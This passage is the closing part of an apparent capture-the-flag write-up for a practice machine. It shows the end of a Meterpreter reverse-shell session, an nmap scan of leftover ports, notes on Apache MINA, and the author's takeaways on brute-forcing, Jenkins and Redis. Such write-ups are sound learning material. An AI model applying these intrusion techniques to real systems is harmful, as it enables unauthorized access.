[*] Meterpreter session 1 opened (192.168.217.132:8080 -> 192.168.217.128:48103) at 2017-12-12 12:49:19 -0500

meterpreter > 
[!] Deleting /tmp/wE472W payload file
```

Lastly, there were some other open ports, but I couldn't use them for exploitation.

``` 
PORT      STATE SERVICE     VERSION
46201/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequest: 
|     Unrecognized protocol:
|   DNSVersionBindReq: 
|     Unrecognized protocol: 
|     version
|_    bind
53180/tcp open  ssh         Apache Mina sshd 0.8.0 (protocol 2.0)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port46201-TCP:V=7.60%I=7%D=12/2%Time=5A22FB7C%P=x86_64-pc-linux-gnu%r(D
SF:NSVersionBindReq,36,"Unrecognized\x20protocol:\x20\0\x06\x01\0\0\x01\0\
SF:0\0\0\0\0\x07version\x04bind\0\0\x10\0\x03\n")%r(DNSStatusRequest,24,"U
SF:nrecognized\x20protocol:\x20\0\0\x10\0\0\0\0\0\0\0\0\0\n");
```

Interestingly, it was the first time I encountered Apache Mina, so this was a good occasion to learn more about it:

> Apache MINA is a network application framework which helps users develop high performance and high scalability 
> network applications easily. It provides an abstract event-driven asynchronous API over various transports such as 
> TCP/IP and UDP/IP via Java NIO.

Well, this was fun box and I learned a lot from it. The bruteforce exercises were interesting, because I could familiarize myself with tools I hadn't used before, like patator and fcrackzip. Rest of the web application vulnerabilities were pretty straightforward, but I liked the Jenkins and Redis ones, which were something fresher than the usual Apache/PHP app challenges. All in all, a great machine to learn more about web app security, and one I strongly recommend.

### Learn more

Redis security: http://antirez.com/news/96

``` 
 _______________________________________
/ This will be a memorable month -- no  \
\ matter how hard you try to forget it. /
 ---------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```
